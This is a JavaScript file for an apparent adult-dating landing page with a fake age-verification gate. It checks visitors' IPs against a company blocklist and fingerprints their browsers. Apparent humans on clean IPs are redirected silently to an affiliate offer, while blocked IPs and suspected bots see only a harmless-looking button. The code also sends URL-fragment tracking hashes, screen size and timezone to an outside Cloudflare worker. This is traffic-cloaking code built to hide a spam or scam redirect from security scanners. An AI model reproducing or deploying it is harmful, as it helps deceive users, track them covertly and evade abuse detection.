// ========== CONFIGURATION ==========
const WORKER_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/verify';
const IP_CHECK_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/check-ip';
const DEFAULT_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=121832&s1=G20&s2=G20';
const NORWAY_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=153951&s1=G20&s2=G20';

// ========== GLOBAL STATE ==========
let userCountry = '';

// ========== AVATAR LIST (Rotated randomly on load) ==========
const AVATAR_LIST = [
    'https://cdn.jsdelivr.net/gh/HamiguaLu/jslib/bot.detect/avatar/1.webp',
    'https://cdn.jsdelivr.net/gh/HamiguaLu/jslib/bot.detect/avatar/2.webp',
    'https://cdn.jsdelivr.net/gh/HamiguaLu/jslib/bot.detect/avatar/3.webp',
];

// ========== LOCALIZATION ==========
const TRANSLATIONS = {
    en: {
        headline: 'Access restricted to 18+ only!',
        subtitle: 'This website contains adult content. Please confirm your age to view and connect with profiles near you.',
        buttonText: 'I am 18+ · Confirm',
        buttonLoading: 'Verifying...',
        footer1: '✓ Over 18',
        footer2: '✓ 100% Discreet',
        footer3: '✓ Real profiles'
    },
    sv: {
        headline: 'Åtkomst begränsad till 18+ endast!',
        subtitle: 'Denna webbplats innehåller vuxet innehåll. Vänligen bekräfta din ålder för att visa och ansluta till profiler nära dig.',
        buttonText: 'Jag är 18+ · Bekräfta',
        buttonLoading: 'Verifierar...',
        footer1: '✓ Över 18 år',
        footer2: '✓ 100% Diskret',
        footer3: '✓ Äkta profiler'
    },
    de: {
        headline: 'Zugang nur für 18+!',
        subtitle: 'Diese Website enthält Inhalte für Erwachsene. Bitte bestätigen Sie Ihr Alter, um Profile in Ihrer Nähe anzuzeigen und zu verbinden.',
        buttonText: 'Ich bin 18+ · Bestätigen',
        buttonLoading: 'Überprüfung läuft...',
        footer1: '✓ Über 18',
        footer2: '✓ 100% Diskret',
        footer3: '✓ Echte Profile'
    },
    da: {
        headline: 'Adgang begrænset til 18+ kun!',
        subtitle: 'Denne hjemmeside indeholder voksenindhold. Bekræft venligst din alder for at se og forbinde med profiler nær dig.',
        buttonText: 'Jeg er 18+ · Bekræft',
        buttonLoading: 'Verificerer...',
        footer1: '✓ Over 18',
        footer2: '✓ 100% Diskret',
        footer3: '✓ Ægte profiler'
    },
    no: {
        headline: 'Tilgang begrenset til 18+ kun!',
        subtitle: 'Dette nettstedet inneholder voksent innhold. Vennligst bekreft alderen din for å se og koble til profiler nær deg.',
        buttonText: 'Jeg er 18+ · Bekreft',
        buttonLoading: 'Verifiserer...',
        footer1: '✓ Over 18',
        footer2: '✓ 100% Diskret',
        footer3: '✓ Ekte profiler'
    },
    fi: {
        headline: 'Pääsy rajoitettu vain 18+!',
        subtitle: 'Tämä verkkosivusto sisältää aikuisille tarkoitettua sisältöä. Vahvista ikäsi nähdäksesi ja muodostaaksesi yhteyden lähelläsi oleviin profiileihin.',
        buttonText: 'Olen 18+ · Vahvista',
        buttonLoading: 'Vahvistetaan...',
        footer1: '✓ Yli 18',
        footer2: '✓ 100% Diskreetti',
        footer3: '✓ Aitoja profiileja'
    }
};

// Get browser language
function getBrowserLanguage() {
    const lang = navigator.language || navigator.languages?.[0] || 'en';
    const langCode = lang.split('-')[0].toLowerCase();
    const supported = ['en', 'sv', 'de', 'da', 'no', 'fi'];
    return supported.includes(langCode) ? langCode : 'en';
}

// Get translations for current language
function getTranslations() {
    const lang = getBrowserLanguage();
    return TRANSLATIONS[lang] || TRANSLATIONS.en;
}

// Extract fragment data from URL hash (#in=... or #usr=...)
function getFragmentData() {
    const hash = window.location.hash.substring(1);
    if (!hash) return '';
    
    try {
        const params = new URLSearchParams(hash);
        if (params.has('in')) return params.get('in');
        if (params.has('usr')) return params.get('usr');
    } catch(e) {}
    
    return hash;
}

// Extract camp code from fragment data
function extractCampCode(fragmentData) {
    if (!fragmentData || typeof fragmentData !== 'string') {
        console.log('[CampCode] Ingen fragmentdata tillhandahölls');
        return null;
    }
    
    if (fragmentData.length === 34) {
        const hexRegex = /^[0-9a-fA-F]+$/;
        if (hexRegex.test(fragmentData)) {
            const md5Part = fragmentData.substring(0, 32);
            const campCodeHex = fragmentData.substring(32, 34);
            const campCodeValue = parseInt(campCodeHex, 16);
            
            console.log('[CampCode] Extraktion lyckades!');
            console.log(`  - Fullständig data: ${fragmentData}`);
            console.log(`  - MD5-del (32 tecken): ${md5Part}`);
            console.log(`  - Camp-kod hex (2 tecken): ${campCodeHex}`);
            console.log(`  - Camp-kod decimal (0-255): ${campCodeValue}`);
            
            return {
                fullData: fragmentData,
                md5: md5Part,
                campCodeHex: campCodeHex,
                campCodeDecimal: campCodeValue,
                isValid: true
            };
        } else {
            console.log('[CampCode] Data är 34 tecken men inte giltig hex');
            return { isValid: false, reason: 'Inte giltig hex' };
        }
    } else {
        console.log(`[CampCode] Datalängd är ${fragmentData.length}, förväntade 34 tecken för MD5+camp-format`);
        return { isValid: false, reason: `Ogiltig längd: ${fragmentData.length}` };
    }
}

// Pick the redirect URL based on country
function getRedirectUrl() {
    return (userCountry === 'NO') ? NORWAY_REDIRECT_URL : DEFAULT_REDIRECT_URL;
}

// Send data to Cloudflare Worker and redirect.
// Picks the URL itself (based on global userCountry), or uses the worker's
// redirectUrl if the worker returned one.
async function sendToCloudflareAndRedirect(userData) {
    try {
        const response = await fetch(WORKER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                fragmentData: userData,
                screenSize: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: Date.now()
            })
        });
        
        const result = await response.json();
        const finalUrl = result.redirectUrl || getRedirectUrl() || `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
        window.location.href = finalUrl;
    } catch (error) {
        window.location.href = getRedirectUrl();
    }
}

// Select a random avatar
function getRandomAvatarUrl() {
    if (!AVATAR_LIST || AVATAR_LIST.length === 0) return '';
    const randomIndex = Math.floor(Math.random() * AVATAR_LIST.length);
    return AVATAR_LIST[randomIndex];
}

// Apply camp code styling (placeholder)
function applyCampCodeStyling(campCodeData) {
    if (!campCodeData || !campCodeData.isValid) return;
    const campValue = campCodeData.campCodeDecimal;
    console.log(`[CampCode Styling] Skulle applicera stilar för camp-kod: ${campValue}`);
}

// ========== IP CHECK ==========

// Check if IP is in filter list. Returns { blocked, country } object.
async function checkIPBlocked() {
    try {
        console.log('[IP Check] Checking IP...');
        const response = await fetch(IP_CHECK_URL);
        const data = await response.json();
        
        console.log('[IP Check] Result:', data);
        console.log(`[IP Check] Country: ${data.country}`);
        
        if (data.blocked) {
            console.log(`[IP Check] IP is BLOCKED - Company: ${data.company}, Range: ${data.matchedRange}`);
        } else {
            console.log('[IP Check] IP is NOT blocked');
        }
        
        return {
            blocked: !!data.blocked,
            country: (data.country || '').toUpperCase()
        };
    } catch (error) {
        console.error('[IP Check] Failed:', error);
        return { blocked: false, country: '' };
    }
}

// ========== FINGERPRINTJS INTEGRATION ==========

// Load FingerprintJS from CDN
function loadFingerprintJS() {
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/gh/HamiguaLu/jslib/bot.detect/fp.min.js';
        script.onload = () => {
            console.log('[FingerprintJS] Loaded successfully');
            resolve();
        };
        script.onerror = () => {
            console.log('[FingerprintJS] Failed to load');
            reject(new Error('Failed to load FingerprintJS'));
        };
        document.head.appendChild(script);
    });
}

// Check Fingerprint. Returns TRUE if this looks like a bot (or if we can't tell),
// FALSE only if we are confident it is a real human.
async function checkFingerprintIsBot() {
    try {
        if (typeof FingerprintJS === 'undefined') {
            console.log('[FingerprintJS] Not available - treating as bot');
            return true;
        }
        
        console.log('[FingerprintJS] Generating fingerprint...');
        const fp = await FingerprintJS.load();
        const result = await fp.get();
        
        console.log('[FingerprintJS] Confidence score:', result.confidence.score);
        
        if (result.confidence.score > 0.8) {
            console.log('[FingerprintJS] High confidence (> 0.8) - treating as bot');
            return true;
        } else {
            console.log('[FingerprintJS] Low confidence (<= 0.8) - treating as human');
            return false;
        }
    } catch (error) {
        console.error('[FingerprintJS] Error - treating as bot:', error);
        return true;
    }
}

// ========== UI FUNCTIONS ==========

// Create and show verification button
function createVerificationButton() {
    const app = document.getElementById('app');
    if (!app) return;
    
    const fragmentData = getFragmentData();
    const t = getTranslations();
    
    const campCodeData = extractCampCode(fragmentData);
    applyCampCodeStyling(campCodeData);
    
    const cardHtml = `
        <div class="verification-card">
            <div class="brand-headline">
                <h2>${t.headline}</h2>
                <p>${t.subtitle}</p>
            </div>
            
            <div id="button-mount"></div>
            
            <div class="footer-note">
                <span>${t.footer1}</span>
                <span>${t.footer2}</span>
                <span>${t.footer3}</span>
            </div>
        </div>
    `;
    
    app.innerHTML = cardHtml;
    
    const mountPoint = document.getElementById('button-mount');
    if (!mountPoint) return;
    
    const chosenAvatar = getRandomAvatarUrl();
    const avatarContainer = document.createElement('div');
    avatarContainer.className = 'avatar-container';
    avatarContainer.innerHTML = `
        <div class="avatar-wrapper">
            <img class="avatar-img" src="${chosenAvatar}" alt="Verifierad profil">
        </div>
    `;
    mountPoint.parentNode.insertBefore(avatarContainer, mountPoint);
    
    const shadowHost = document.createElement('div');
    shadowHost.style.display = 'flex';
    shadowHost.style.alignItems = 'center';
    shadowHost.style.justifyContent = 'center';
    mountPoint.appendChild(shadowHost);
    
    const shadowRoot = shadowHost.attachShadow({ mode: 'open' });
    
    const style = document.createElement('style');
    style.textContent = `
        .cf-button {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            background: #0f172a;
            border: none;
            border-radius: 60px;
            padding: 16px 40px;
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            font-size: 1.05rem;
            font-weight: 700;
            color: white;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 10px 25px -5px rgba(15, 23, 42, 0.3), 0 4px 8px rgba(0, 0, 0, 0.04);
            letter-spacing: -0.1px;
            width: auto;
            min-width: 320px;
        }
        .cf-button:hover {
            background: #1e293b;
            transform: translateY(-1px);
            box-shadow: 0 14px 30px -8px rgba(15, 23, 42, 0.4);
        }
        .cf-button:active {
            transform: translateY(1px);
            box-shadow: 0 6px 14px -5px rgba(15, 23, 42, 0.3);
        }
        .cf-icon {
            font-size: 1.25rem;
            display: inline-flex;
            align-items: center;
        }
        .cf-checkbox {
            width: 20px;
            height: 20px;
            background: rgba(255,255,255,0.15);
            border: 2px solid rgba(255,255,255,0.6);
            border-radius: 30px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            transition: 0.15s;
        }
        .cf-spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.65s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .cf-text {
            font-weight: 600;
        }
        .cf-button.loading {
            opacity: 0.9;
            cursor: wait;
        }
    `;
    
    const button = document.createElement('div');
    button.className = 'cf-button';
    button.innerHTML = `
        <span class="cf-icon">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
        </span>
        <div class="cf-checkbox"></div>
        <span class="cf-text">${t.buttonText}</span>
    `;
    
    shadowRoot.appendChild(style);
    shadowRoot.appendChild(button);
    
    let clicked = false;
    
    button.addEventListener('click', async function() {
        if (clicked) return;
        clicked = true;
        
        const iconSpan = button.querySelector('.cf-icon');
        const checkboxDiv = button.querySelector('.cf-checkbox');
        const textSpan = button.querySelector('.cf-text');
        
        if (iconSpan) iconSpan.style.opacity = '0.5';
        if (checkboxDiv) {
            checkboxDiv.classList.remove('cf-checkbox');
            checkboxDiv.classList.add('cf-spinner');
        }
        if (textSpan) textSpan.textContent = t.buttonLoading;
        
        button.style.cursor = 'not-allowed';
        button.style.opacity = '0.9';
        button.style.transform = 'none';
        
        const userData = getFragmentData();
        await sendToCloudflareAndRedirect(userData);
    });
}

// ========== MAIN APP INITIALIZATION (PARALLEL) ==========

async function initApp() {
    console.log('[App] Initializing...');
    
    // ========== RUN BOTH CHECKS IN PARALLEL ==========
    console.log('[App] Running IP check and FingerprintJS in parallel...');
    
    const [ipResult, isBot] = await Promise.all([
        checkIPBlocked(),                          // IP check -> { blocked, country }
        loadFingerprintJS().then(() => {           // Load FP + check if bot
            return checkFingerprintIsBot();
        }).catch(() => {
            return true; // FP failed to load -> treat as bot
        })
    ]);
    
    const ipBlocked = ipResult.blocked;
    userCountry = ipResult.country;   // store globally for later use
    
    console.log(`[App] IP blocked: ${ipBlocked}, Country: ${userCountry}, isBot: ${isBot}`);
    
    // ========== DECIDE BASED ON RESULTS ==========
    // Rule: IP blocked OR bot -> show button.
    //       Otherwise (clean IP AND human) -> redirect automatically.
    
    if (ipBlocked || isBot) {
        console.log('[App] IP blocked or bot detected - showing button');
        createVerificationButton();
        return;
    }
    
    // Clean IP + human -> auto redirect (URL picked by country)
    console.log('[App] Clean IP + human - auto-redirecting');
    const userData = getFragmentData();
    await sendToCloudflareAndRedirect(userData);
}

// Start application when DOM is ready
document.addEventListener('DOMContentLoaded', initApp);